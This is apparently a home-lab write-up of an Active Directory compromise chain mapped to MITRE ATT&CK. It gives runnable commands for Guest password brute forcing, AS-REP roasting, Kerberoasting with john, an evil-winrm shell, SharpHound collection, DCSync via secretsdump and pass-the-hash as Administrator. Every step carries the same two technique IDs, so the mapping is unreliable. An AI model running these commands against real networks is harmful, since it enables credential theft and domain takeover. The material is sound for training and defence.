---
title: Attack Scenarios (MITRE)
---

# Attack Scenarios (mapped to MITRE ATT&CK)
Passwords and hashes have been concealed to retain confidentiality.

## <u>Brute Forcing Guest Account</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding`
![1](img/1.png){ loading=lazy }


## <u>Enumerating SMB Shares</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`nxc smb 192.168.25.141 -u 'Guest' -p '_________' --shares`
![2](img/3.png){ loading=lazy }


## <u>ASReproast Domain Account</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`nxc ldap 192.168.25.137 -u 'Bob' -p '' --asreproast asreproast.txt`
![3](img/4.png){ loading=lazy }
`john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt`
![4](img/5.png){ loading=lazy }


## <u>WinRM Shell with Domain Account</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`nxc winrm 192.168.25.137 -u 'Bob' -p '_________’`
![5](img/6.png){ loading=lazy }
`evil-winrm -i 192.168.25.137 -u 'bob' -p '_________’`
![6](img/7.png){ loading=lazy }

## <u>Upload and Execution of SharpHound</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`upload SharpHound.exe`
![7](img/7.png){ loading=lazy }
`./SharpHound.exe`
![8](img/8.png){ loading=lazy }

## <u>Exfiltration of Data Collected by SharpHound</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`download 20250910173643_BloodHound.zip`
![10](img/10.png){ loading=lazy }

## <u>Bloodhound</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`download 20250910173643_BloodHound.zip`
![11](img/11.png){ loading=lazy }

## <u>Kerberoast of Service Account</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt`
![12](img/12.png){ loading=lazy }
`john --wordlist=/usr/share/wordlists/rockyou.txt kerbroast.txt`
![13](img/13.png){ loading=lazy }

## <u>DCSync</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local`
![14](img/14.png){ loading=lazy }

## <u>Pass-the-hash to Login as Domain Admin</u>
- **Techniques:** T1021.002 (SMB), T1003 (Credential Dumping)
- **Procedure:**

`evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________’`
![15](img/15.png){ loading=lazy }
